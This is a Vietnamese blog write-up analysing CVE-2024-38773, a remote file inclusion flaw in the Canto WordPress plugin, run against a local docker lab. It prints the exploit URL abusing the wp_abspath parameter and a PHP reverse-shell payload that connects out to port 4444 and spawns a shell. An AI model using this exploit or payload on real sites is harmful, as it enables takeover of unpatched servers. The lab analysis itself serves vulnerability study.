---
layout: post
title:  "CVE-2024-38773 Analysis"
date:   2025-10-30 21:44:56 +0700
categories: wordpress
---
# Info:

Type: Remote Code Execution

Plugin Name: **Canto**

Version: < 3.0.7

**Base Score:** [**9.8 CRITICAL**](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?name=CVE-2024-38773&vector=AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H&version=3.1&source=NIST)

**Vector:**  CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

NIST: [NIST](https://nvd.nist.gov/vuln/detail/CVE-2024-38773)

WPScan: [WPScan](https://wpscan.com/vulnerability/1595af73-6f97-4bc9-9cb2-14a55daaa2d4/)

# PoC:

Khởi chạy wordpress trên docker cổng 9000 sau đó thực hiện cài đặt thư viện canto v3.0.6.

Tại thư mục lib của thư viện các file đang thực hiện gọi đến trang `/wp-admin/admin.php` thông qua lệnh `require_once urldecode($_REQUEST['wp_abspath']) . '/wp-admin/admin.php';`

![image.png]({{ site.url }}/assets/images/CVE-2024-25096/image.png)

![image.png]({{ site.url }}/assets/images/CVE-2024-25096/image-2.png)

Lệnh `require_once urldecode($_REQUEST['wp_abspath']) . '/wp-admin/admin.php';` có mục đích tải nội dung của file admin.php vào trang hiện tại. Ví dụ khi người dùng truyền vào `?wp_abspath=/etc/passwd`  thì đường dẫn được require_once vào code sẽ trở thành `require_once '/etc/passwd/wp-admin/admin.php';`. Kiểm tra lại trên code bằng cách debug như sau

![image.png]({{ site.url }}/assets/images/CVE-2024-25096/image-3.png)

![image.png]({{ site.url }}/assets/images/CVE-2024-25096/image-4.png)

Tại vị trí này, ta có thể thấy đây là lỗ hổng LFI nhưng khó để khai thác vì code mặc định luôn thêm đường dẫn `/wp-admin/admin.php` vào phía sau payload dẫn đến đường dẫn không tồn tại trong hệ thống. Khi gửi request thì hệ thống sẽ trả về status 500

![image.png]({{ site.url }}/assets/images/CVE-2024-25096/image-5.png)

Tuy không đọc được file bằng đường dẫn nội bộ nhưng ta có thể tạo server chứa file mã độc và cho hệ thống thực hiện require_once:

Thực hiện tạo server trả về code php

![image.png]({{ site.url }}/assets/images/CVE-2024-25096/image-6.png)

Khởi tạo cho poc chạy trên cổng 6000 bằng lệnh: `php -S 0.0.0.0:6000` 

![image.png]({{ site.url }}/assets/images/CVE-2024-25096/image-7.png)

Vì bài lab đang sử dụng wordpress chạy trên docker nên ta sẽ phải thực hiện thay địa chỉ local thành ip theo dải của docker. Tức là thay vì truy cập đến localhost, ta sẽ truy cập đến dải IP 172.17.0.1 của docker. Thực hiện truy cập đến đường dẫn `http://localhost:9000/wp-content/plugins/canto/includes/lib/download.php?wp_abspath=http://172.17.0.1:6000`

![image.png]({{ site.url }}/assets/images/CVE-2024-25096/image-8.png)

Thực hiện tạo reverse shell bằng payload.

```
<?php
header("Content-Type: text/plain");

echo '<?php $sock=fsockopen("172.17.0.1",4444);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes); ?>';
```

![image.png]({{ site.url }}/assets/images/CVE-2024-25096/image-2.png)

### Lưu ý: Cách khai thác này chỉ thành công nếu trong cấu hình php của server wordpress có `allow_url_include = On`